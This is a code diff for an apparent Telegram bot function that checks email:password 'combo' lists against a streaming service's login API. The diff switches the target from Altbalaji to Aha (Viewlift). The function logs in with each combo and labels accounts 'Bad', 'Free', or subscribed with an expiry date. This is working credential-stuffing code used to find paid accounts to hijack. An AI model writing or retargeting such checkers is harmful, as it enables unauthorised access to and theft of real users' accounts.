@@ -14,7 +14,7 @@ def aha_helper(chat_id, combo):
     password = f'"password":"{inpupass}"'
 
     session_request = requests.Session()
-    url = 'https://api.cloud.altbalaji.com/accounts/login?domain=IN'
+    url = 'https://prod-api.viewlift.com/identity/signin?platform=android&device=android_phone&site=aha-tv&deviceId=4f32e3efcd996ee4&deviceName=Google%20G011A'
     payload = '{%s,%s}' %(email, password)
     response = session_request.post(url, data=payload)
     result = response.json()
@@ -22,11 +22,11 @@ def aha_helper(chat_id, combo):
         state=result['status']
         code=result['code']
         messg = result['message']
-        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: Altbalaji</b>'
+        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: Aha</b>'
         Editmessage(chat_id, text, status)
         return
     session_token = result['session_token']
-    subs_url = 'https://payment.cloud.altbalaji.com/accounts/orders?limit=1&domain=IN'
+    subs_url = 'https://prod-api.viewlift.com/payments/billing-history?site=aha-tv'
     head2 = {
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
         'accept': 'application/json, text/plain, */*',
@@ -39,7 +39,7 @@ def aha_helper(chat_id, combo):
     response = session_request.get(subs_url, headers=head2)
     result = response.json()
     if result['orders'] == []:
-         expired_text = f'<b>Free Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Free</b>'
+         expired_text = f'<b>Free Combo ❌</b>\n<b>Site: Aha</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Free</b>'
          Editmessage(chat_id, expired_text, status)
          return
     validto = result['orders'][0]['dates']['valid_to']
